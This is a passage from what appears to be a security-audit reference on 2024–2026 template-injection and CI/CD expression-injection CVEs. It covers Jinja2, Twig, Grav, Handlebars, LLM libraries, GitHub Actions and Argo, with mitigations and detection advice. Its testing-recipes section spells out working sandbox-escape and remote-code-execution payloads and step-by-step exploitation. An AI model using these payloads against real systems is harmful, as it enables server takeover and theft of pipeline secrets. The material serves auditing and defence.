The mitigation is similar: use env-var indirection and validate any user-influenced input before script interpolation.

### Jenkins pipeline expression

Jenkins pipelines defined via `Jenkinsfile` use Groovy templating. `${...}` in a `sh` step interpolates via Groovy string templating, then the resulting string reaches shell execution.

**Vulnerable pattern**: `sh "curl https://api.example.com/${params.INPUT}"` where `params.INPUT` is a build parameter with attacker control.

**Mitigation**: use single-quoted strings (which do not interpolate in Groovy) and pass parameters as environment variables to the shell step.

### Ansible playbook Jinja2

Ansible uses Jinja2 for playbook variable substitution. The class shape: attacker-influenced facts (from a compromised or malicious host) contain Jinja2 syntax that gets evaluated on the control node when the facts are re-templated.

**Mitigation**: disable `INJECT_FACTS_AS_VARS`, use `no_log`, treat host-reported facts as untrusted.

### Argo Workflows CVE-2026-31892 mechanism depth

The `podSpecPatch` field is a JSON-serialized Kubernetes pod-spec patch that Argo applies to the workflow pod before launch. Argo's Strict/Secure mode restricts what template references can appear in `podSpecPatch`. The bypass: attacker-supplied fields in the workflow's arguments-shape reference variables that Argo's template-reference allow-list did not enumerate, allowing the attacker to inject arbitrary pod-spec content.

**Impact**: launching a pod with attacker-chosen image, command, mount, and security context. This is container-launch capability on the K8s cluster.

**Chain**: attacker-launched pod → K8s API access via the pod's service-account token → RBAC-scoped cluster operations. If the target cluster has a broad service-account RBAC, this reaches cluster-admin.

**CVE-2026-42296 and CVE-2026-54526** — the incomplete-fix chain. The initial fix for CVE-2026-31892 addressed one specific path; subsequent audits found additional paths (42296) and then a third (54526). This is a classic incomplete-fix pattern; assume the fix landscape is not complete until Argo issues a class-level fix.

### CircleCI, Drone.io, Bitbucket Pipelines

Each has its own expression-interpolation mechanism. The audit shape is the same:
1. Identify the platform's expression syntax.
2. Enumerate variables accessible in the expression context.
3. Trace whether attacker-influenced variables reach shell-step composition.
4. Test the shell-metachar injection.

### The AI-generated workflow class

A 2025–2026 emerging class: workflows generated by AI code assistants (Copilot Workspace, Cursor, Aider) that don't apply env-var indirection by default. AI-generated YAML often uses `${{ ... }}` directly in `run:` blocks because that is the pattern in the training data (most public tutorials use the vulnerable pattern). Audit AI-generated CI/CD YAML with extra scrutiny.

## Grav Cluster — Depth Continued

Additional context on the Grav CMS Twig cluster:

**Grav's Twig integration architecture**. Grav ships Twig as its template engine, exposes `grav` as a global in the template context, and provides a "Twig processing" mode that allows page content to be templated via Twig. The design intent is that themes and pages can leverage Twig features. The security model is that page authors are trusted, but user-editable content (blog posts, admin-editable pages) may reach the Twig context.

**Sandbox status in Grav**. Grav does not use Twig's SandboxExtension by default; the framework's design assumes trusted authors. The Grav CVE cluster demonstrates that this assumption breaks whenever user-editable content reaches the Twig-processing path.

**Fix architecture in 1.7.45**. The fixes for CVE-2024-28118 and CVE-2024-28119 were specific to the two mechanisms — restricting access to `registerUndefinedFunctionCallback` and `setEscaper` via the exposed `grav` global. The class-level fix (removing engine access entirely from the template context) was not applied; other similar exposures may exist.

**Fix architecture in 1.8.0-beta.27**. CVE-2025-66294 fix improved the `cleanDangerousTwig` regex but did not restructure the sanitization approach to non-regex.

**Post-cluster audit implications for Grav**:
- Any user-editable content path that reaches Twig processing is still a candidate for the class shape.
- Any Grav plugin that adds template globals or engine-access shortcuts extends the surface.
- The `evaluate_twig()` function should be treated as a suspect sink; any use of it on user input is a first-tier finding.

**Adjacent CMS audit**:
- **October CMS** — uses Twig; audit for similar engine-exposure patterns.
- **Symfony CMS** — Twig with SandboxExtension usually configured, but check per-deployment.
- **Statamic** — uses Antlers plus Twig; audit both.
- **CraftCMS** — uses Twig; check for engine exposure via `Craft.` global.

## Cross-Cluster Audit Coordination

For a target with multiple potential SSTI surfaces (multi-engine deployment, LLM-tooling, CI/CD), the coordination:

1. **Enumerate all surfaces** — every template-rendering path, every LLM-prompt path, every CI/CD workflow.
2. **Fingerprint each** — engine, version, sandbox mode, framework wrapper.
3. **Cross-reference each against this file's CVE tables**.
4. **Prioritize by trigger and impact** — an SSTI reachable pre-auth is higher priority than one requiring admin access; a CI/CD injection on `pull_request_target` (secrets access) is higher than on `pull_request` (no secrets).
5. **Report per surface** — do not consolidate into a single finding; each surface has its own fix path.

**Compound engagement scenario** — a target with:
- Public site using unsandboxed Twig (RCE via CVE-2024-45411).
- Admin dashboard using Jinja2 with `Environment()` (RCE via classical dunder walk).
- LLM inference service using banks (RCE via CVE-2026-44209).
- GitHub Actions workflow with expression injection (repo-write via `pull_request_target`).

Each is a distinct high-severity finding; the report captures all four with distinct fix recommendations.

## The Class Predicts the Next Bug — SSTI Pattern Framing

Each CVE in this file exemplifies a class shape that predicts the next SSTI CVE.

**Class shape 1: "Filter returns unwrapped callable"** (exemplar: Jinja2 CVE-2025-27516).
Any template engine sandbox where a filter/method returns a callable without gating the returned callable through the sandbox's check has this class. Predicted follow-ons in other engines:
- Twig filters — audit each for return-value handling.
- FreeMarker `?api` builtin (already partially addressed post-2.3.30).
- Handlebars helper return values.

**Class shape 2: "Consistency-check gap across code paths"** (exemplar: Twig CVE-2024-45411).
Any system where a security check is applied at some code paths but not others. Predicted follow-ons: framework-integration paths that reach the engine differently from direct API use.

**Class shape 3: "Framework exposes engine internals"** (exemplar: Grav CMS Twig cluster).
Any CMS/framework that exposes the underlying template engine as a global in the template context. Predicted follow-ons: audit every CMS that has "raw engine access" as a template feature.

**Class shape 4: "Default-to-unsafe API adoption"** (exemplar: SSTI+LLM cluster).
Any library ecosystem where the documented default is unsafe. Predicted follow-ons: audit every LLM-tooling library for `Environment()` vs `SandboxedEnvironment()`; the pattern generalizes to any library that uses a template engine as an internal implementation detail without exposing the sandbox choice.

**Class shape 5: "Compile-time validator vs code-generator mismatch"** (exemplar: Handlebars AST-type-confusion).
Any two-phase compilation pipeline where validator and generator disagree on interpretation. Predicted follow-ons: audit other template engines with separate compile and render phases (Django's compile phase, Twig's compile phase).

**Class shape 6: "Trusted evaluator with attacker-influenced input"** (exemplar: GitHub Actions, Argo Workflows).
Any evaluator that trusts operator-authored strings that in practice carry attacker input. Predicted follow-ons: every CI/CD system's expression evaluator; any workflow-orchestration system's template-reference mechanism.

## Frontier Cross-Reference Table

The single-owner CVEs and their exact routing across the trio:

| CVE / Advisory | Class | Owned in | Base file mention | Advanced file mention |
|----------------|-------|----------|-------------------|------------------------|
| CVE-2025-27516 / GHSA-cpwx-vrp4-4pq7 | Jinja2 `\|attr` filter sandbox escape | this file | class mention | class mention |
| CVE-2024-45411 / GHSA-6j75-5wfj-gh66 | Twig three-condition sandbox bypass | this file | class mention | class mention |
| CVE-2026-46636 | Symfony Twig sandbox bypass | this file | class mention | class mention |
| CVE-2024-28118 / GHSA-r6vw-8v8r-pmp4 | Grav CMS Twig `registerUndefinedFunctionCallback` | this file | (via Grav cluster mention) | (via Grav cluster mention) |
| CVE-2024-28119 / GHSA-2m7x-c7px-hp58 | Grav CMS Twig `setEscaper` | this file | (via Grav cluster mention) | (via Grav cluster mention) |
| CVE-2025-66294 / GHSA-662m-56v4-3r8f | Grav CMS `cleanDangerousTwig` regex weakness | this file | (via Grav cluster mention) | (via Grav cluster mention) |
| CVE-2026-44209 / GHSA-gphh-9q3h-jgpp | banks LLM-tooling `Environment()` regression | this file | class mention (SSTI+LLM) | (via SSTI+LLM crossover) |
| CVE-2024-41950 | Haystack LLM-tooling `Environment()` regression | this file | class mention (SSTI+LLM) | (via SSTI+LLM crossover) |
| CVE-2025-25362 | spacy-llm LLM-tooling `Environment()` regression | this file | class mention (SSTI+LLM) | (via SSTI+LLM crossover) |
| Handlebars 8-advisory March 2026 wave (GHSA-2w6w, -9cx6, -xjpj, -3mfm, -xhpv, -2qvq, -7rx3, -442j) | AST type confusion + partial injection | this file | class mention | class mention |
| Smarty 4-advisory 2024–2026 cluster (GHSA-4rmg, -cq55, -f6wf, -rjhh) | `{extends}` injection + SSRF via redirect | this file | class mention | class mention |
| GHSA-7x29-qqmq-v6qc | Ultralytics Actions expression injection | this file | class mention (CI/CD) | (via CI/CD frontier) |
| GHSL-2024-051 (Misskey) | GitHub Actions expression injection | this file | class mention (CI/CD) | (via CI/CD frontier) |
| GHSL-2024-277 (Appsmith) | GitHub Actions expression injection | this file | class mention (CI/CD) | (via CI/CD frontier) |
| CVE-2026-31892 / GHSA-3wf5-g532-rcrr | Argo Workflows `podSpecPatch` bypass | this file | class mention (CI/CD) | (via CI/CD frontier) |
| CVE-2025-64133 (Jenkins SECURITY-3583) | Jenkins Extensible Choice Parameter CSRF | this file | class mention | (via CI/CD frontier) |

**Version-string single-ownership** — every version boundary in this trio appears in exactly one place (this file). If a version string ever leaks into `ssti.md` or `ssti_advanced_deep.md`, that is a trio-ownership violation to correct.

**GHSA-ID single-ownership** — every GHSA identifier appears only in this file. If a GHSA ID leaks into the other files, correct it to a CVE-number-only mention with a pointer.

## Testing Recipes for the 2024–2026 CVEs

**Jinja2 CVE-2025-27516 recipe**:
```
1. Fingerprint Jinja2 version. Send a payload that produces a syntax error and read the stack trace class name.
2. Verify version falls in <= 3.1.5 range.
3. Confirm SandboxedEnvironment via {{ ''.__class__ }} → SecurityError.
4. Fire the bypass: {{ ''|attr('format')|attr('__globals__') }}.
5. If globals leak, walk to __builtins__ and to import → os → popen.
6. Exec: {{ ''|attr('format')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}
7. Rebuttal: fire against Jinja2 3.1.6+; the |attr filter now respects the sandbox.
```

**Twig CVE-2024-45411 recipe**:
```
1. Fingerprint Twig version. Read version from Twig-emitted error pages.
2. Verify version falls in the affected range (1.0.0–1.44.7, 2.0.0–2.16.0, 3.0.0–3.11.0, 3.12.0–3.13.x).
3. Identify a template previously loaded in non-sandboxed context (typical: shared layout templates).
4. Craft include from a sandboxed context by name: {% sandbox %}{% include 'known_template' %}{% endsandbox %}.
5. Inside the included template, use the _self.env.registerUndefinedFilterCallback gadget.
6. Rebuttal: fire against Twig 1.44.8+, 2.16.1+, 3.11.1+, 3.14.0+.
```

**Grav CMS Cluster recipe** (all three CVEs):
```
1. Fingerprint Grav version via /admin or /system/config disclosure.
2. Access an editable Twig page (blog post, admin-editable content).
3. Try CVE-2024-28118 payload: {{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}{{ grav.config.set('system.twig.undefined_functions', false) }}{{ grav.twig.twig.getFunction('id') }}
4. Try CVE-2024-28119 payload: {{ grav.twig.twig.extensions.core.setEscaper('system','system') }}{{ ['id']|escape('system','system') }}
5. Try CVE-2025-66294: nested evaluate_twig payload targeting the cleanDangerousTwig regex.
6. Rebuttal: fire against Grav 1.7.45 (CVE-2024-28118/28119) or 1.8.0-beta.27 (CVE-2025-66294).
```

**SSTI+LLM (banks CVE-2026-44209) recipe**:
```
1. Identify LLM-tooling library and version in target's dependencies.
2. Locate the prompt-template entry point (usually an inference endpoint accepting a "prompt" or "template" field).
3. Test with SSTI probe: {{7*7}} — evaluated to 49 confirms Jinja is running.
4. If sandbox mode unknown: {{ ''.__class__ }} — if returned, unsandboxed.
5. Full RCE payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
6. Rebuttal: submit against banks 2.4.2+ (or the specific patched version per library).
```

**GitHub Actions expression-injection recipe**:
```
1. Enumerate the target repo's workflow files (.github/workflows/*.yml).
2. Look for ${{ github.event.* }} or ${{ github.head_ref }} references inside run: blocks.
3. Identify the trigger event (pull_request, pull_request_target, issue_comment, etc.).
4. If pull_request_target: severity is higher (secrets access).
5. Submit a PR (or issue comment, per the trigger) with attacker-controlled input containing shell metachars.
6. Wait for the CI run; check whether the exploit fires.
7. If fires: capture the workflow log, identify what data the shell had access to (GITHUB_TOKEN scope, secrets exposure).
```

**Argo Workflows CVE-2026-31892 recipe**:
```
1. Identify the Argo Workflows version deployed on the target cluster.
2. Verify the target uses WorkflowTemplates with Strict/Secure template-reference mode.
3. Submit a WorkflowTemplate with attacker-supplied fields in podSpecPatch or ArtifactGC.
4. Confirm the pod launches with attacker-controlled spec.
5. Rebuttal: same against a patched Argo version.
```

## Attribution Corrections

For the 2024–2026 SSTI cluster, several attributions are worth stating explicitly to avoid propagating errors:

- **Jinja2 CVE-2025-27516** — the `|attr` filter → `str.format` bypass is a specific mechanism, not a general "SandboxedEnvironment is broken" issue. Prior blog-tier writeups sometimes conflate this with general sandbox brokenness; the correct framing is the specific `|attr` filter's return-value handling.
- **Grav CMS Twig cluster** — the three CVEs are distinct mechanisms, not variants of one bug. Each requires its own audit and its own fix.
- **SSTI+LLM class** — the three CVEs share the same root cause; do not describe them as three separate bugs. The class shape is "LLM libraries default to unsandboxed Jinja2."
- **Handlebars March 2026 wave** — eight advisories share the same publication date but are distinct mechanisms. Do not conflate them or describe them as "one bug with eight advisories."
- **Argo CVE-2024-47827** — this is a DoS, not expression-injection RCE. Any labeling of it as expression-injection is wrong; the real Argo class is CVE-2026-31892 cluster.
- An Argo-related GHSA identifier from earlier briefings does not resolve against the GHSA API; do not re-cite.

## SSTI-adjacent CVE Categories (2024–2026)

For completeness, adjacent CVE categories that overlap with SSTI but are technically different classes:

- **Symfony 2026 UX/LiveComponent** — CVE-2026-49208 through CVE-2026-49216 cover XSS, CSRF, DoS, and HMAC-binding issues in Symfony UX. Not SSTI per se but adjacent to Twig rendering.
- **Symfony 2026 UX icons/toolkit** — CVE-2026-55877 / CVE-2026-55878 XSS + path traversal. Not SSTI.
- **Django 2024–2026 template-engine** — no publicly disclosed template-engine CVEs; DTL is stable. Includes here for negative-case reference.

## Class-Shape Extrapolation to Adjacent Libraries

For each of the 2024–2026 CVEs, the class shape predicts sibling bugs in adjacent libraries not yet audited.

**Jinja2 `|attr` class → predicted sibling audits**:
- All Twig filters that return callables — do they gate the callable's invocation through SecurityPolicy?
- Handlebars custom helpers — are helper return values gated by the Handlebars sandbox?
- FreeMarker `?api` builtin — this is the FreeMarker equivalent; already partially addressed post-2.3.30.

**Twig three-condition bypass → predicted sibling audits**:
- All template engines with sandbox modes — audit consistency of security-check application across all code paths that reach the render step.
- Any include/extend/import path in Jinja / FreeMarker / Velocity — verify sandbox mode is preserved across paths.

**Grav CMS engine-exposure class → predicted sibling audits**:
- WordPress Twig-plugin ecosystem — any plugin that exposes Twig internals as template globals.
- Drupal Twig integration — Drupal 8+ uses Twig; audit for exposed engine access.
- Any headless CMS with Twig support — Statamic, October CMS.

**SSTI+LLM class → predicted sibling audits**:
- LangChain — audit every prompt-template class for `Environment()` vs `SandboxedEnvironment()`.
- LlamaIndex — same.
- Instructor — Pydantic-based; if using Jinja for structured prompt composition, audit.
- CrewAI — multi-agent framework.
- Autogen — Microsoft.
- Semantic Kernel — Microsoft.
- Any Hugging Face Transformers pipeline that composes prompts via Jinja.

**Handlebars AST-confusion class → predicted sibling audits**:
- Mustache implementations that share Handlebars-derived AST processing.
- Any template engine with a separate compile vs render phase — verify validator/generator agreement.

**CI/CD expression-injection class → predicted sibling audits**:
- GitLab CI — parallel surface to GitHub Actions.
- Azure DevOps YAML pipelines — `$(variable)` interpolation into script steps.
- CircleCI configuration — parameter interpolation.
- Drone.io — pipeline scripting.
- Any CI/CD platform with expression evaluation in shell-step composition.

## Version-Boundary Timeline Summary

Compact chronological view of the 2024–2026 SSTI CVE landscape:

- **2024-01** — GHSA-h5c8 (Jinja2 xmlattr).
- **2024-05** — GHSA-h75v (Jinja2 xmlattr follow-on).
- **2024-05** — GHSA-4rmg (Smarty {extends}).
- **2024-07** — CVE-2024-41950 (Haystack).
- **2024-09** — CVE-2024-45411 (Twig three-condition).
- **2024-04** — GHSL-2024-051 (Misskey Actions).
- **2024-10** — GHSL-2024-277 (Appsmith Actions).
- **2024-late** — GHSA-7x29 (Ultralytics Actions).
- **2024-12** — GHSA-gmj6, GHSA-q2x7 (Jinja2 malicious filenames).
- **2024-early** — CVE-2024-28118, CVE-2024-28119 (Grav).
- **2025-early** — CVE-2025-25362 (spacy-llm).
- **2025-03** — CVE-2025-27516 (Jinja2 |attr).
- **2025-late** — CVE-2025-66294 (Grav cleanDangerousTwig).
- **2025-10** — Jenkins 2025-10-29 bundle.
- **2026-03** — Handlebars March 2026 wave (8 advisories).
- **2026-07** — Smarty 2026 cluster (GHSA-cq55, GHSA-f6wf, GHSA-rjhh).
- **2026-mid** — Argo CVE-2026-31892 cluster (+ 42296, 54526 follow-ons).
- **2026-mid** — CVE-2026-44209 (banks).
- **2026** — CVE-2026-46636 (Symfony Twig).

## Operational Reporting for SSTI Frontier Findings

**Version-specific CVE reference** — every frontier finding names the CVE with the exact GHSA or NVD URL. The version boundary is the finding, so the reader needs the primary source.

**Class-shape framing** — every finding is framed at two levels: the specific CVE ("Jinja2 CVE-2025-27516 |attr filter sandbox escape") and the class shape ("filter returns unwrapped callable"). The class shape lets the client understand the audit posture beyond the single CVE.

**Follow-through recommendations** — every finding carries an actionable follow-through:
- Version-pinning strategy for the affected library.
- Sandbox-mode audit process (specifically: audit every template-engine instantiation for sandbox mode).
- Framework-migration recommendation if the finding is class-endemic (e.g., "migrate from raw Jinja2 to a schema-restricted template DSL").
- Continuous-monitoring recommendation for CI/CD expression-injection findings (e.g., "audit all workflows for `${{ github.event.* }}` in `run:` blocks; add pre-commit hooks to catch new instances").

**Attribution discipline**:
- Never conflate the eight Handlebars advisories as a single bug.
- Never describe the three LLM-tooling CVEs as three independent bugs — the class shape is the finding.
- Never label CVE-2024-47827 (Argo) as expression-injection; it is a DoS.
- Always cite the specific GHSA + CVE + primary-source URL per finding.

**Screenshot / wire-trace attachments** — every finding attaches (a) the exact template payload, (b) the exact HTTP request/response, (c) the callback log (OAST) if used, (d) the fingerprint evidence. For CI/CD findings, attach the workflow log.

**Confidence-tier discipline** — the report distinguishes:
- **Confirmed** — RCE / repo-write demonstrated with concrete output.
- **Reachable** — sink runs, gadget fires, but exec/impact not yet demonstrated.
- **Suspected** — sink signature present but no callback and no error probe response.

**Rebuttal artifact** — every finding attempts submission against a patched adjacent instance and reports the outcome. Rebuttal that fails cleanly proves the fix; rebuttal that reproduces on both prod and staging suggests staging is also unpatched or the finding is not version-specific.

## The SSTI Frontier — Class Shapes as Predictions

The 2024–2026 CVEs each exemplify a class; the classes predict the next CVE:

**Predicted next Jinja2 CVE** — filter output-handling remains a candidate. Any Jinja2 filter that produces a callable, an object with methods, or a value that reaches attribute access without being sandboxed at the return boundary is a candidate.

**Predicted next Twig CVE** — consistency of security-check application across code paths remains a candidate. Any framework integration of Twig that reaches the render path via a non-standard route is a candidate.

**Predicted next SSTI+LLM CVE** — LangChain, LlamaIndex, semantic-kernel, autogen, CrewAI are candidates. Adopting `Environment()` as the documented default remains standard practice in the LLM ecosystem.

**Predicted next Handlebars CVE** — the compile step's AST validation vs code generation split remains an audit-worthy surface. Any new AST-node type added in a future release is a candidate for the same class shape.

**Predicted next CI/CD expression-injection CVE** — any CI/CD platform's expression evaluator remains a candidate as new context variables are added. GitHub Actions, GitLab CI, Argo Workflows are the current highlighted platforms; CircleCI, Drone, Bitbucket Pipelines are audit-relevant.

**Predicted next Grav-shape CMS CVE** — any CMS with engine-exposure globals is a candidate. Statamic, OctoberCMS, CraftCMS have been noted; others exist.

The frontier is not a static set of CVEs but a set of class shapes that predict where the next audit will land. In pen-testing engagements, apply the class-shape audit approach even when the target's specific version does not match a known CVE — if the class shape is present, the exploit may exist.

## Cross-Cutting Audit Checklists

**Pre-engagement fingerprinting checklist** (before firing any SSTI payload):
- [ ] Enumerate every template-rendering path in the target — HTTP endpoints, email templates, PDF generators, admin dashboards, LLM inference services, CI/CD workflows.
- [ ] Fingerprint the specific engine at each: exact library and version, framework wrapper, sandbox mode.
- [ ] Cross-reference each (engine, version) tuple against the CVE tables in this file.
- [ ] Enumerate all attacker-controllable input paths to each template-rendering endpoint.
- [ ] Identify high-privilege trigger contexts (admin actions, background jobs, `pull_request_target`).

**Pre-payload confirmation checklist**:
- [ ] Sink evaluation confirmed with the base's math-probe pair (`{{7*7}}` → 49 and `{{7*8}}` → 56).
- [ ] Engine fingerprint confirmed with two independent probes.
- [ ] Sandbox mode confirmed via mode-fingerprint probe.
- [ ] Version-boundary confirmed against the CVE table.

**Post-exploit reporting checklist**:
- [ ] Exact payload attached (in the exact wire encoding used).
- [ ] Full request/response wire trace attached.
- [ ] Callback log (OAST) with source IP, timestamp, headers.
- [ ] Fingerprint evidence attached.
- [ ] Fixed-version rebuttal result attached.
- [ ] Chain graph for compound findings.
- [ ] Confidence tier explicit.
- [ ] Follow-through recommendation for the client.

**Multi-surface engagement report structure**:
- Per SSTI surface, one finding with the above artifacts.
- Cross-cutting recommendations at the class level (e.g., "audit all template-engine instantiations across the codebase for sandbox mode; the specific CVEs are symptoms of a class-level issue").

## Detection Instrumentation

For runtime detection of SSTI probes on defenders' side, three approaches:

**WAF signature detection** — the classical approach. Match `{{7*7}}`, `${7*7}`, `<%=7*7%>`, `#{7*7}` and their common bypass variants. Detection is straightforward but signature-based, so evasion via encoding, whitespace, and case variation defeats it.

**Runtime instrumentation of the template engine** — hook the compile/render calls and log every input. Any input containing template-syntax characters that reaches a rendering call from a user-input path is flagged. Higher fidelity than WAF-signature because it observes the actual sink, not the request wire.

**Reachability-based static detection** — CodeQL / Semgrep custom rules that identify `render_template_string(user_input)` / `Template(user_input)` / `template_from_string(user_input)` sink patterns across the codebase. Point-in-time snapshot; requires re-run on codebase changes.

**Combined approach** for enterprise defenders: runtime instrumentation for high-confidence real-time detection + reachability-based static detection for pre-deployment audit + WAF signature for defense-in-depth against known-shape attacks.

**Instrumentation implementation** — for Jinja2, subclass `SandboxedEnvironment` and log every `getattr` and `getitem`; for Twig, subclass `Environment` and log every `compile`; for Handlebars, wrap `Handlebars.compile` with a logging wrapper. Each hooks the parse/compile path where SSTI intent is observable before the render fires. Enterprise defenders should also mirror the logs to a SIEM (Splunk, Datadog, ELK) with alerting rules for known SSTI-probe shapes.

**False-positive rate** — legitimate template-editor features generate similar signals (an admin editing a template will produce template-syntax characters in the request). Distinguish attacker patterns from admin patterns by (a) source-IP context (attacker outside the admin IP allowlist), (b) authentication context (unauthenticated probes vs authenticated admin), (c) payload complexity (attacker-shape payloads have signature reflection-walk patterns).

**Runtime detection integration with CI/CD** — for defenders, ship the instrumentation alongside every template-rendering service and require the instrumentation to be enabled in production configuration. This is the "shift-left" approach: catch SSTI probes at runtime rather than waiting for post-exploitation forensics.

## Summary

The 2024–2026 frontier for SSTI is dominated by four shifts. First: the Jinja2 `SandboxedEnvironment` remains defense-in-depth, not a security boundary — CVE-2025-27516 (`|attr` filter → `str.format` bypass) plus four adjacent 2024 advisories show the sandbox bypass surface is continuously discovered. Second: LLM-tooling libraries default to unsandboxed Jinja2 — three CVEs (banks CVE-2026-44209, Haystack CVE-2024-41950, spacy-llm CVE-2025-25362) share the identical root cause, and the class predicts follow-ons in LangChain / LlamaIndex / semantic-kernel / autogen. Third: CI/CD expression-injection is a distinct class — GitHub Actions (Ultralytics GHSA-7x29, Misskey GHSL-2024-051, Appsmith GHSL-2024-277) and Argo Workflows (CVE-2026-31892 cluster) share the "trusted evaluator with attacker input" primitive; the mitigation is env-var indirection. Fourth: Handlebars had a March 2026 8-advisory wave dominated by AST-type-confusion in the compile step, plus adjacent partial-injection and CLI-precompiler classes. The `ssti.md` base owns the technique-class primitive tour and routing; `ssti_advanced_deep.md` owns the sandbox-differential dissection and per-engine escape catalogs; this file owns the per-CVE version tables single-owner, the mechanism decomposition, and the class-shape pattern framing that predicts the next bug.
